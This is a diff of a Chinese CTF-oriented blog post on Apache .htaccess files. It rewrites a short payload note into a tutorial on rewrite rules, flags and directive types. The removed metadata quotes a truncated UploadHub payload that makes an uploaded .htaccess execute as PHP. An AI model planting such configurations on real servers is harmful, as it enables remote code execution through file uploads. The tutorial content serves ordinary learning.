@@ -1,18 +1,670 @@
-<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0"/><meta name="author" content="Regulus"/><meta name="copyright" content="Regulus"/><meta name="theme-color" content="#FFB347"/><meta name="format-detection" content="telephone=no"/><meta name="keywords" content="Hexo Theme MEOW"/><meta name="mobile-web-app-capable" content="yes"/><meta name="apple-mobile-web-app-capable" content="yes"/><meta name="apple-touch-fullscreen" content="yes"/><meta name="application-name" content="htaccess | Mei的小窝"/><meta name="apple-mobile-web-app-title" content="htaccess | Mei的小窝"/><meta name="apple-mobile-web-app-status-bar-style" content="#FFB347"/><link rel="canonical" href="http://example.com/2025/06/08/htaccess/"/><meta name="description" content="htaccess文件payload前言这个文件专门来放.htaccess文件的payload，不然根本记不住。 [JMCTF 2021]UploadHub123456789&lt;FilesMatch .htaccess&gt;SetHandler application&#x2F;x-httpd-php Require all granted  php_flag engine on	&lt;&#x2F;Fil...">
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0"/><meta name="author" content="Regulus"/><meta name="copyright" content="Regulus"/><meta name="theme-color" content="#FFB347"/><meta name="format-detection" content="telephone=no"/><meta name="keywords" content="Hexo Theme MEOW"/><meta name="mobile-web-app-capable" content="yes"/><meta name="apple-mobile-web-app-capable" content="yes"/><meta name="apple-touch-fullscreen" content="yes"/><meta name="application-name" content="htaccess文件配置 | Mei的小窝"/><meta name="apple-mobile-web-app-title" content="htaccess文件配置 | Mei的小窝"/><meta name="apple-mobile-web-app-status-bar-style" content="#FFB347"/><link rel="canonical" href="http://example.com/2025/06/08/htaccess/"/><meta name="description" content="htaccess文件配置及payload前言作为文件上传漏洞的重要文件，通过.htaccess可以配置Apache服务器，实现一些修改Apache默认配置。能结合文件上传的原因是，.htaccess覆盖Apache的配置无需重启服务器也可以生效。 .htaccess是一个纯文本文件，它里面存放着Apache服务器配置相关的指令。.htaccess主要的作用有：URL重写、自定义错误页面、MI...">
 <meta property="og:type" content="article">
-<meta property="og:title" content="htaccess | Mei的小窝">
+<meta property="og:title" content="htaccess文件配置 | Mei的小窝">
 <meta property="og:url" content="http://example.com/2025/06/08/htaccess/index.html">
 <meta property="og:site_name" content="Mei的小窝">
-<meta property="og:description" content="htaccess文件payload前言这个文件专门来放.htaccess文件的payload，不然根本记不住。 [JMCTF 2021]UploadHub123456789&lt;FilesMatch .htaccess&gt;SetHandler application&#x2F;x-httpd-php Require all granted  php_flag engine on	&lt;&#x2F;Fil...">
+<meta property="og:description" content="htaccess文件配置及payload前言作为文件上传漏洞的重要文件，通过.htaccess可以配置Apache服务器，实现一些修改Apache默认配置。能结合文件上传的原因是，.htaccess覆盖Apache的配置无需重启服务器也可以生效。 .htaccess是一个纯文本文件，它里面存放着Apache服务器配置相关的指令。.htaccess主要的作用有：URL重写、自定义错误页面、MI...">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://example.com/2025/06/08/htaccess/assets/images/Hexo-Theme-MEOW.png">
 <meta property="article:published_time" content="2025-06-08T11:26:43.000Z">
-<meta property="article:modified_time" content="2025-06-08T11:48:00.635Z">
+<meta property="article:modified_time" content="2026-02-15T09:06:08.614Z">
 <meta property="article:author" content="Regulus">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://example.com/2025/06/08/htaccess/assets/images/Hexo-Theme-MEOW.png"><meta name="robots" content="index,follow"/><meta name="googlebot" content="index,follow"/><meta name="revisit-after" content="1 days"/><title>htaccess | Mei的小窝</title><link rel="shortcut icon" href="/assets/images/Hexo-Theme-MEOW.ico"><link rel="preconnect" href="/assets"/><link rel="preconnect" href="assets"/>
+<meta name="twitter:image" content="http://example.com/2025/06/08/htaccess/assets/images/Hexo-Theme-MEOW.png"><meta name="robots" content="index,follow"/><meta name="googlebot" content="index,follow"/><meta name="revisit-after" content="1 days"/><title>htaccess文件配置 | Mei的小窝</title><link rel="shortcut icon" href="/assets/images/Hexo-Theme-MEOW.ico"><link rel="preconnect" href="/assets"/><link rel="preconnect" href="assets"/>
 <link rel="stylesheet" href="/css/style.css">
-<link rel="prefetch" href="/"/><link rel="prefetch" href="/archives"/><link rel="prefetch" href="/tags"/><meta name="generator" content="Hexo 7.3.0"></head><body bg-style="none"><header><div id="navbar"><div id="nav-info"><a id="site-icon" href="/" title="主页"><img src="/assets/images/Hexo-Theme-MEOW.png" alt="Logo"/></a><a id="site-name" href="/" title="主页"><div>Mei的小窝</div><img src="/assets/images/svg/uc/uc-home.svg" class="icon noview" alt="Icon"></a></div><div id="nav-menu"><div class="menu-item"><a href="javascript:void(0);"><img src="/assets/images/svg/uc/uc-article.svg" class="icon noview" alt="Icon"><span>文章</span></a><ul class="sub-menu-item"><li><a href="/archives"><img src="/assets/images/svg/uc/uc-archive.svg" class="icon noview" alt="Icon"><span>归档</span></a></li><li><a href="/categories"><img src="/assets/images/svg/uc/uc-category.svg" class="icon noview" alt="Icon"><span>分类</span></a></li><li><a href="/tags"><img src="/assets/images/svg/uc/uc-tag.svg" class="icon noview" alt="Icon"><span>标签</span></a></li><li><a href="/about"><img src="/assets/images/svg/uc/uc-about.svg" class="icon noview" alt="Icon"><span>关于</span></a></li></ul></div></div><div id="nav-function"><div id="search-btn"><a href="javascript:void(0);" title="搜索" accesskey="s"><img src="/assets/images/svg/uc/uc-search.svg" class="icon noview" alt="Icon"><span>搜索</span></a></div><div id="menu-btn"><a href="javascript:void(0);" title="打开菜单"><img src="/assets/images/svg/uc/uc-menu.svg" class="icon noview" alt="Icon"></a></div></div></div></header><div id="menu-aside"><div id="menu-aside-container"><div id="menu-aside-info"><a href="/" title="主页"><img src="/assets/images/Hexo-Theme-MEOW.png" alt="Logo"/></a><a href="/" title="主页">Mei的小窝</a></div><div class="menu-aside-item"><a href="javascript:void(0);"><img src="/assets/images/svg/uc/uc-article.svg" class="icon noview" alt="Icon"><span>文章</span></a><ul class="menu-aside-sub-item"><li><a href="/archives"><img src="/assets/images/svg/uc/uc-archive.svg" class="icon noview" alt="Icon"><span>归档</span></a></li><li><a href="/categories"><img src="/assets/images/svg/uc/uc-category.svg" class="icon noview" alt="Icon"><span>分类</span></a></li><li><a href="/tags"><img src="/assets/images/svg/uc/uc-tag.svg" class="icon noview" alt="Icon"><span>标签</span></a></li><li><a href="/about"><img src="/assets/images/svg/uc/uc-about.svg" class="icon noview" alt="Icon"><span>关于</span></a></li></ul></div><hr/></div></div><main><div class="banner"><div class="banner-info"><div class="banner-avatar"><img src="/assets/images/Hexo-Theme-MEOW.png" alt="Avatar"/></div><div class="banner-title">「 Mei的小窝 」</div></div></div><div class="post-container"><div class="post-main"><div class="post-content"><h1 class="post-title">htaccess</h1><div class="post-author"><span>作者: Regulus</span></div><div class="post-meta"><div class="post-info"><div class="post-date"><div class="post-pubdate"><img src="/assets/images/svg/ta/ta-pubdate.svg" class="icon noview" alt="Icon"><span>发表于2025-06-08</span></div><div class="post-update"><img src="/assets/images/svg/ta/ta-update.svg" class="icon noview" alt="Icon"><span>更新于2025-06-08</span></div></div><div class="post-read"><div class="post-wordcount"><img src="/assets/images/svg/ta/ta-write.svg" class="icon noview" alt="Icon"><span>总字数: 240字</span></div><div class="post-readtime"><img src="/assets/images/svg/ta/ta-time.svg" class="icon noview" alt="Icon"><span>阅读时长: 1分钟</span></div><div class="post-pageview"><img src="/assets/images/svg/ta/ta-fire.svg" class="icon noview" alt="Icon"><span>访问量: </span><span id="vercount_value_page_pv"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"  stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 6l0 -3" /><path d="M16.25 7.75l2.15 -2.15" /><path d="M18 12l3 0" /><path d="M16.25 16.25l2.15 2.15" /><path d="M12 18l0 3" /><path d="M7.75 16.25l-2.15 2.15" /><path d="M6 12l-3 0" /><path d="M7.75 7.75l-2.15 -2.15" /></svg></span></div></div></div><div class="post-attribute"></div></div><div class="post markdown" indent="false"><h1 id="htaccess文件payload"><a href="#htaccess文件payload" class="headerlink" title="htaccess文件payload"></a>htaccess文件payload</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这个文件专门来放.htaccess文件的payload，不然根本记不住。</p>
+<link rel="prefetch" href="/"/><link rel="prefetch" href="/archives"/><link rel="prefetch" href="/tags"/><meta name="generator" content="Hexo 7.3.0"></head><body bg-style="none"><header><div id="navbar"><div id="nav-info"><a id="site-icon" href="/" title="主页"><img src="/assets/images/Hexo-Theme-MEOW.png" alt="Logo"/></a><a id="site-name" href="/" title="主页"><div>Mei的小窝</div><img src="/assets/images/svg/uc/uc-home.svg" class="icon noview" alt="Icon"></a></div><div id="nav-menu"><div class="menu-item"><a href="javascript:void(0);"><img src="/assets/images/svg/uc/uc-article.svg" class="icon noview" alt="Icon"><span>文章</span></a><ul class="sub-menu-item"><li><a href="/archives"><img src="/assets/images/svg/uc/uc-archive.svg" class="icon noview" alt="Icon"><span>归档</span></a></li><li><a href="/categories"><img src="/assets/images/svg/uc/uc-category.svg" class="icon noview" alt="Icon"><span>分类</span></a></li><li><a href="/tags"><img src="/assets/images/svg/uc/uc-tag.svg" class="icon noview" alt="Icon"><span>标签</span></a></li><li><a href="/about"><img src="/assets/images/svg/uc/uc-about.svg" class="icon noview" alt="Icon"><span>关于</span></a></li></ul></div></div><div id="nav-function"><div id="search-btn"><a href="javascript:void(0);" title="搜索" accesskey="s"><img src="/assets/images/svg/uc/uc-search.svg" class="icon noview" alt="Icon"><span>搜索</span></a></div><div id="menu-btn"><a href="javascript:void(0);" title="打开菜单"><img src="/assets/images/svg/uc/uc-menu.svg" class="icon noview" alt="Icon"></a></div></div></div></header><div id="menu-aside"><div id="menu-aside-container"><div id="menu-aside-info"><a href="/" title="主页"><img src="/assets/images/Hexo-Theme-MEOW.png" alt="Logo"/></a><a href="/" title="主页">Mei的小窝</a></div><div class="menu-aside-item"><a href="javascript:void(0);"><img src="/assets/images/svg/uc/uc-article.svg" class="icon noview" alt="Icon"><span>文章</span></a><ul class="menu-aside-sub-item"><li><a href="/archives"><img src="/assets/images/svg/uc/uc-archive.svg" class="icon noview" alt="Icon"><span>归档</span></a></li><li><a href="/categories"><img src="/assets/images/svg/uc/uc-category.svg" class="icon noview" alt="Icon"><span>分类</span></a></li><li><a href="/tags"><img src="/assets/images/svg/uc/uc-tag.svg" class="icon noview" alt="Icon"><span>标签</span></a></li><li><a href="/about"><img src="/assets/images/svg/uc/uc-about.svg" class="icon noview" alt="Icon"><span>关于</span></a></li></ul></div><hr/></div></div><main><div class="banner"><div class="banner-info"><div class="banner-avatar"><img src="/assets/images/Hexo-Theme-MEOW.png" alt="Avatar"/></div><div class="banner-title">「 Mei的小窝 」</div></div></div><div class="post-container"><div class="post-main"><div class="post-content"><h1 class="post-title">htaccess文件配置</h1><div class="post-author"><span>作者: Regulus</span></div><div class="post-meta"><div class="post-info"><div class="post-date"><div class="post-pubdate"><img src="/assets/images/svg/ta/ta-pubdate.svg" class="icon noview" alt="Icon"><span>发表于2025-06-08</span></div><div class="post-update"><img src="/assets/images/svg/ta/ta-update.svg" class="icon noview" alt="Icon"><span>更新于2026-02-15</span></div></div><div class="post-read"><div class="post-wordcount"><img src="/assets/images/svg/ta/ta-write.svg" class="icon noview" alt="Icon"><span>总字数: 5.3k字</span></div><div class="post-readtime"><img src="/assets/images/svg/ta/ta-time.svg" class="icon noview" alt="Icon"><span>阅读时长: 18分钟</span></div><div class="post-pageview"><img src="/assets/images/svg/ta/ta-fire.svg" class="icon noview" alt="Icon"><span>访问量: </span><span id="vercount_value_page_pv"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"  stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 6l0 -3" /><path d="M16.25 7.75l2.15 -2.15" /><path d="M18 12l3 0" /><path d="M16.25 16.25l2.15 2.15" /><path d="M12 18l0 3" /><path d="M7.75 16.25l-2.15 2.15" /><path d="M6 12l-3 0" /><path d="M7.75 7.75l-2.15 -2.15" /></svg></span></div></div></div><div class="post-attribute"></div></div><div class="post markdown" indent="false"><h1 id="htaccess文件配置及payload"><a href="#htaccess文件配置及payload" class="headerlink" title="htaccess文件配置及payload"></a>htaccess文件配置及payload</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>作为文件上传漏洞的重要文件，通过.htaccess可以配置Apache服务器，实现一些修改Apache默认配置。能结合文件上传的原因是，.htaccess覆盖Apache的配置无需重启服务器也可以生效。</p>
+<p><code>.htaccess</code>是一个纯文本文件，它里面存放着Apache服务器配置相关的指令。<br><code>.htaccess</code>主要的作用有：<strong>URL重写、自定义错误页面、MIME类型配置以及访问权限控制等。</strong>主要体现在伪静态的应用、图片防盗链、自定义404错误页面、阻止&#x2F;允许特定IP&#x2F;IP段、目录浏览与主页、禁止访问指定文件类型、文件密码保护等。<br><code>.htaccess</code>的用途范围主要针对当前目录。</p>
+<h2 id="1-htaccess文件核心组成"><a href="#1-htaccess文件核心组成" class="headerlink" title="1. .htaccess文件核心组成"></a>1. .htaccess文件核心组成</h2><p><code>.htaccess</code> 文件是一个<strong>纯文本文件</strong>，通常包含以下类型的指令：</p>
+<p><strong>常用指令类型</strong></p>
+<div class="table-container"><table>
+<thead>
+<tr>
+<th>指令类型</th>
+<th>示例</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>认证与授权</td>
+<td>AuthType Basic</td>
+<td>密码保护目录</td>
+</tr>
+<tr>
+<td>URL 重写</td>
+<td>RewriteRule <code>^old.html$ new.html [R=301]</code></td>
+<td>重定向或美化 URL</td>
+</tr>
+<tr>
+<td>错误页面定制</td>
+<td>ErrorDocument 404 &#x2F;404.html</td>
+<td>自定义 404 页面</td>
+</tr>
+<tr>
+<td>禁止访问</td>
+<td>Deny from all</td>
+<td>阻止特定 IP 或用户代理访问</td>
+</tr>
+<tr>
+<td>MIME 类型设置</td>
+<td>AddType application&#x2F;x-httpd-php .php</td>
+<td>定义文件类型处理方式</td>
+</tr>
+<tr>
+<td>缓存控制</td>
+<td>ExpiresActive On</td>
+<td>设置浏览器缓存策略</td>
+</tr>
+<tr>
+<td>PHP 配置覆盖</td>
+<td>php_value upload_max_filesize 20M</td>
+<td>修改 PHP 运行参数（如上传限制）</td>
+</tr>
+</tbody></table></div>
+<h2 id="2-htaccess-的核心作用"><a href="#2-htaccess-的核心作用" class="headerlink" title="2. .htaccess 的核心作用"></a>2. .htaccess 的核心作用</h2><h3 id="1-URL-重写"><a href="#1-URL-重写" class="headerlink" title="1. URL 重写"></a>1. URL 重写</h3><div class="code-container" code-lang="Plaintext"><div class="codebox"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RewriteEngine On</span><br><span class="line">RewriteRule ^article/([0-9]+)/?$ article.php?id=$1 [L]</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+
+<p>这是一个简单的URL重写配置，我们可以通过路由以及路径变量的方式访问php服务，php没有自带路由还是太伤了。</p>
+<p>这个将<code>article/([0-9]+)/?</code>这个正则表达式，其中括号包起来的是捕获组。这个正则表达式匹配到的都会访问指定的url。然后参数是由捕获组进行赋值的<code>$1</code>代表的是正则中的第一个捕获组，当访问<code>article/123/</code>的时候会将123赋值给id，没有设置捕获组的参数继续使用GET传参。</p>
+<h4 id="1-重写引擎RewriteEngine"><a href="#1-重写引擎RewriteEngine" class="headerlink" title="1.重写引擎RewriteEngine"></a>1.重写引擎RewriteEngine</h4><div class="code-container" code-lang="Plaintext"><div class="codebox"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RewriteEngine On</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+
+<p><strong>必须写</strong>，否则所有 <code>RewriteRule</code>、<code>RewriteCond</code> 都不生效。<br>位置通常放在 .htaccess 的开头。</p>
+<h4 id="2-RewriteRule重写URL"><a href="#2-RewriteRule重写URL" class="headerlink" title="2.RewriteRule重写URL"></a>2.RewriteRule重写URL</h4><div class="code-container" code-lang="Plaintext"><div class="codebox"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RewriteRule Pattern Substitution [flags]</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+
+<ul>
+<li><strong>Pattern</strong>：正则表达式，匹配<strong>当前请求的 URL 路径</strong>（注意：<strong>不包含协议、域名、查询字符串</strong>）</li>
+<li><strong>Substitution</strong>：重写后的目标地址（可以是相对路径、绝对路径、甚至完整 URL）</li>
+<li><strong>flags</strong>：可选，控制重写行为，多个 flag 用逗号隔开</li>
+</ul>
+<p>我们需要注意正则表达式匹配的url路径只需要相对或者绝对url路径就行了，不需要协议，域名，以及查询参数。可以将路径变量通过正则表达式里面的捕获组和查询参数进行匹配但是不是刚需。</p>
+<p><strong>如果加了完整的url，就302重定向跳转url也会改变而不是这种路由映射。</strong></p>
+<p>比如这个命令</p>
+<div class="code-container" code-lang="Plaintext"><div class="codebox"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">RewriteRule ^article/([0-9]+)/?$ article.php?id=$1 [L,QSA]</span><br><span class="line">#正则只匹配了id这个参数,如果没加QSA则不会接收page这个参数</span><br><span class="line">请求：https://example.com/article/123?page=2</span><br><span class="line">匹配路径：/article/123           ← 查询字符串 ?page=2 不参与匹配</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+
+<p>其中需要注意一些技巧<code>.*</code>可以用来表示所有请求，其中<code>.</code>表示除了换行符的任意一个字符，<code>*</code>则是代表前面的字符重复零次或多次，于是便可表示匹配所有字符串。</p>
+<p>正则表达式后面的<code>-</code>表示不重写url。</p>
+<p>Substitution 的三种形式</p>
+<div class="table-container"><table>
+<thead>
+<tr>
+<th align="left">形式</th>
+<th align="left">示例</th>
+<th align="left">含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">相对路径</td>
+<td align="left"><code>article.php?id=$1</code></td>
+<td align="left">相对于当前目录</td>
+</tr>
+<tr>
+<td align="left">绝对路径</td>
+<td align="left"><code>/news/article.php</code></td>
+<td align="left">相对于网站根目录</td>
+</tr>
+<tr>
+<td align="left">完整URL</td>
+<td align="left"><code>https://other.com/page.php</code></td>
+<td align="left">重定向（需 R flag）</td>
+</tr>
+</tbody></table></div>
+<p><strong>正向捕获与反向引用</strong></p>
+<div class="code-container" code-lang="Plaintext"><div class="codebox"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RewriteRule ^article/([0-9]+)/?$ article.php?id=$1</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+
+<ul>
+<li><code>([0-9]+)</code> 捕获数字 → <code>$1</code> 在 Substitution 中引用</li>
+<li><strong>$0</strong> 表示整个匹配的字符串</li>
+<li><strong>$N</strong> 表示第 N 个捕获组（1 ≤ N ≤ 9）</li>
+</ul>
+<p><strong>常见的FLAG</strong></p>
+<p>[L] —— Last</p>
+<p><strong>停止当前轮次的重写处理</strong>。<br>⚠️ 常见误解：很多人以为 <code>[L]</code> 表示“这是最后一条规则，后面的都不执行”。<br><strong>真相</strong>：<code>[L]</code> 只停止<strong>当前轮次</strong>。如果 Substitution 是相对路径，Apache <strong>会用重写后的 URL 重新进入重写引擎</strong>（新一轮）。</p>
+<div class="code-container" code-lang="Plaintext"><div class="codebox"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">RewriteRule ^a\.php$ b.php [L]</span><br><span class="line">#访问a.php会触发L，然后一b.php再重新访问一次到c.php，实现了从a.php访问到c.php</span><br><span class="line">RewriteRule ^b\.php$ c.php</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+
+<p>✅ 如果要<strong>真正终止</strong>，必须配合：</p>
+<div class="code-container" code-lang="Plaintext"><div class="codebox"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RewriteRule ^a\.php$ b.php [L]</span><br><span class="line">RewriteRule ^b\.php$ - [L]</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+
+
+
+<p>[R] —— Redirect</p>
+<p><strong>强制外部重定向</strong>（浏览器地址栏变化）。和直接映射到完整url不一样，那个不需要加R，Apache会默认重定向，这个是为了区分映射到某个路由还是重定向</p>
+<div class="code-container" code-lang="Plaintext"><div class="codebox"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RewriteRule ^old\.html$ /new.html [R=301,L]</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
+
+<ul>
+<li><code>R=301</code> 永久重定向，<code>R=302</code> 临时重定向，默认 302</li>
+<li>不加 <code>[R]</code> 是内部重写（地址栏不变）</li>
+</ul>
+<p>CTF 里出现 <code>[R]</code> 通常用于<strong>强制 HTTPS</strong> 或者<strong>隐藏真实路径</strong>。难怪有些题目无论访问什么都跳转到index.php</p>
+<p>[F] —— Forbidden</p>
+<p><strong>返回 403 禁止访问</strong>。</p>
